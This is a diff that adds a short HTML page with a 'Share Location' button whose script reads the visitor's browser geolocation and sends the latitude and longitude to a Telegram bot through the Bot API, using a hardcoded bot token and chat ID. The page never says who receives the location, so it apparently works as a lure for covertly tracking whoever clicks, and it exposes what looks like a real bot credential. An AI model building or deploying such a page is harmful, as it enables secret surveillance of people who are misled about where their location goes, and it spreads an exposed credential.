@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Access</title>
+</head>
+<body>
+  <h2>Click to Share Location</h2>
+  <button onclick="getLocation()">Share Location</button>
+  <p id="status"></p>
+
+<script>
+
+const botToken = "8286169680:AAFlw5A7AuqB5nKRyx-7Hdu0XFF_r_gjHoQ";
+const chatId = "8541208450";
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sendToTelegram);
+  } else {
+    document.getElementById("status").innerHTML = "Geolocation not supported.";
+  }
+}
+
+function sendToTelegram(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
+
+  fetch(url)
+    .then(response => {
+      document.getElementById("status").innerHTML = "Location Sent Successfully!";
+    })
+    .catch(error => {
+      document.getElementById("status").innerHTML = "Error sending location.";
+    });
+}
+
+</script>
+</body>
+</html>
